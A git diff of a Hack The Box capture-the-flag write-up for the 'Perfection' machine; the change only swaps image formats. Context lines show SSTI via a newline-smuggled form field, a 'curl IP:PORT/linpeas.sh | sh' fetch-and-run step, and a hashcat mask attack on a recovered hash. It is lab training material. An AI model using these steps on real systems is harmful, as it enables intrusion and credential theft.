@@ -2,7 +2,7 @@
 
 A writeup for the machine [Perfection](https://app.hackthebox.com/machines/Perfection) on Hack The Box.
 
-<Image src={require("./banner.png").default} height="500" />
+<Image src={require("./banner.webp").default} height="500" />
 
 ## Footprinting
 
@@ -21,15 +21,15 @@ nmap -sS <HOST>
 80 -> HTTP
 ```
 
-<Image src={require("./nmap.png").default} />
+<Image src={require("./nmap.webp").default} />
 
 ### Web server
 
 The web server is running a simple website with an home page and a weight calculator form.
 
-<Image src={require("./homepage.png").default} />
+<Image src={require("./homepage.webp").default} />
 
-<Image src={require("./calculator.png").default} />
+<Image src={require("./calculator.webp").default} />
 
 We can try to fuzz the website to find hidden directories.
 
@@ -41,7 +41,7 @@ No hidden directories are found.
 
 If we open a 404 page, we can see that the server is running `Sinatra`, a Ruby web framework.
 
-<Image src={require("./sinatra.png").default} />
+<Image src={require("./sinatra.webp").default} />
 
 ## User flag
 
@@ -55,7 +55,7 @@ It is required to insert an overall weight of 100 otherwise a block message is s
 
 If correct weights are inserted, with categories and grades as alphanumeric characters, the application shows a message with the data inserted.
 
-<Image src={require("./burp-repeater.png").default} />
+<Image src={require("./burp-repeater.webp").default} />
 
 ### SSTI
 
@@ -67,7 +67,7 @@ By looking online, we can find that %0A is a newline character and can be used t
 
 After that, we have to urlencode the payload and insert it in the form.
 
-<Image src={require("./burp-ssti.png").default} />
+<Image src={require("./burp-ssti.webp").default} />
 
 ### Reverse shell
 
@@ -80,9 +80,9 @@ category1=A%0A
 &grade1=11&weight1=20&category2=2&grade2=11&weight2=20&category3=3&grade3=11&weight3=20&category4=4&grade4=11&weight4=20&category5=5&grade5=11&weight5=20
 ```
 
-<Image src={require("./cyberchef.png").default} />
+<Image src={require("./cyberchef.webp").default} />
 
-<Image src={require("./rev-shell.png").default} />
+<Image src={require("./rev-shell.webp").default} />
 
 ## Root flag
 
@@ -92,7 +92,7 @@ Inside the home directory of Susan there is the source code of the web applicati
 
 In the latter, we can find a Sqlite database file.
 
-<Image src={require("./database.png").default} />
+<Image src={require("./database.webp").default} />
 
 The database contains only a table with some users and their hashed passwords.
 
@@ -100,7 +100,7 @@ The database contains only a table with some users and their hashed passwords.
 strings pupilpath_credentials.db
 ```
 
-<Image src={require("./password.png").default} />
+<Image src={require("./password.webp").default} />
 
 
 ### First cracking attempt
@@ -128,7 +128,7 @@ python3 -m http.server
 curl IP:PORT/linpeas.sh | sh
 ```
 
-<Image src={require("./linpeas.png").default} />
+<Image src={require("./linpeas.webp").default} />
 
 There is a mail file for Susan accessible both by the user and the root.
 
@@ -136,7 +136,7 @@ There is a mail file for Susan accessible both by the user and the root.
 cat /var/mail/susan
 ```
 
-<Image src={require("./mail.png").default} />
+<Image src={require("./mail.webp").default} />
 
 ### Cracking the password
 
@@ -154,7 +154,7 @@ It is possible to use Hashcat with a specific mask to crack the password.
 hashcat -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d -m 1400
 ```
 
-<Image src={require("./hashcat.png").default} /> 
+<Image src={require("./hashcat.webp").default} /> 
 
 We can now login through SSH as Susan and retrieve the root flag by switching to the root user.
 
